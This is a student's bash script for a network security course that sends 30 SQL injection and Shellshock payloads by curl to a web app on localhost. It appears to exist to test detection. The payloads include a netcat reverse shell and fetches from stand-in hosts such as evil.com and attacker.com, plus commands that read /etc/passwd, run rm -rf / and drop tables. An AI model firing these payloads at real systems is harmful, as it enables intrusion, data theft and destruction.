#!/bin/bash
# Francesco Chemello  2121346
# Computers and Networks Security

# attack_test.sh
# Simulate various attacks against a web application
# Usage: ./attack_test.sh
# This script is intended for educational purposes only.
# Do not use against any system without permission.

URL="http://localhost:8080"
echo "Attack start$URL"

# Colori per output
GREEN="\e[32m"
RED="\e[31m"
RESET="\e[0m"

function send_attack() {
  echo -e "\n${RED}[Attack $1]${RESET} $2"
  eval "$2"
  echo -e "${GREEN}---- End Attack $1 ----${RESET}\n"
  sleep 1
}

# =======================
# SQL Injection Attacks
# =======================
send_attack 1  "curl -X POST $URL -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=admin' -d 'password=123' -d \"' OR '1'='1\" -i"
send_attack 2  "curl \"$URL/search?q=%27%20OR%201=1--\" -i"
send_attack 3  "curl -H \"Cookie: session=' UNION SELECT NULL,NULL--\" $URL -i"
send_attack 4  "curl -H 'Referer: DROP TABLE users' $URL -i"
send_attack 5  "curl -X POST $URL -H 'Content-Type: application/json' -d '{\"user\":\"test\",\"query\":\"SELECT * FROM users\"}' -i"
send_attack 6  "curl -X TRACE \"$URL/data?filter=NOT+LIKE+'%admin%'\" -i"
send_attack 7  "curl -X OPTIONS -H 'Referer: DROP DATABASE testdb' $URL -i"
send_attack 8  "curl \"$URL/search?q=WHERE+EXISTS+(SELECT+1)\" -i"
send_attack 9  "curl -X POST $URL -d 'data=INSERT INTO users VALUES(...)' -i"
send_attack 10 "curl -X DELETE \"$URL/products?category=electronics'+OR+'x'='x\" -i"
send_attack 11 "curl \"$URL/search?q=IN+(SELECT+password+FROM+users)\" -i"
send_attack 12 "curl -I \"$URL/query?sql=CREATE+TABLE+test(id+int)\" -i"
send_attack 13 "curl \"$URL/search?q=exec+xp_cmdshell('dir')\" -i"
send_attack 14 "curl \"$URL/api?query=SELECT+COUNT(*)+FROM+users\" -i"
send_attack 15 "curl -X POST $URL -d 'query=ALTER TABLE users DROP COLUMN password' -i"

# =======================
# Shellshock Attacks
# =======================
send_attack 16 "curl -A '() { :;}; echo Shellshocked' $URL -i"
send_attack 17 "curl -H 'X-Test: () { :;}; /bin/bash -c \"id\"' $URL -i"
send_attack 18 "curl -H 'User-Agent: () { ignored;}; echo boom' $URL -i"
send_attack 19 "curl -H 'Referer: () { :;}; wget http://evil.com' $URL -i"
send_attack 20 "curl -H 'Cookie: () { :;}; cat /etc/passwd' $URL -i"
send_attack 21 "curl -H 'X-Debug: () { foo;}; rm -rf /' $URL -i"
send_attack 22 "curl -H 'User-Agent: () { :;}; curl http://attacker.com' $URL -i"
send_attack 23 "curl -H 'X-Custom: () { :;}; nc attacker.com 4444 -e /bin/sh' $URL -i"
send_attack 24 "curl -X PUT -H 'User-Agent: ; rm -rf /' $URL -d 'update=1' -i"
send_attack 25 "curl -X POST -H 'Content-Type: application/json' -d '{\"cmd\":\"() { :;}; /bin/bash -c \\\"echo vulnerable\\\"\"}' $URL -i"
send_attack 26 "curl -H 'User-Agent: () { :;}; /usr/bin/perl -e \"print q(shell)\"' $URL -i"
send_attack 27 "curl -X OPTIONS \"$URL/run?cmd=system('curl+http://evil.com')\" -i"
send_attack 28 "curl \"$URL/test?input=&&+whoami\" -i"
send_attack 29 "curl \"$URL/debug?cmd=/usr/bin/env+bash\" -i"
send_attack 30 "curl -H 'Cookie: \`reboot\`' $URL -i"

# =======================
echo -e "\n${GREEN}Attack test complete.${RESET}"
exit 0
# =======================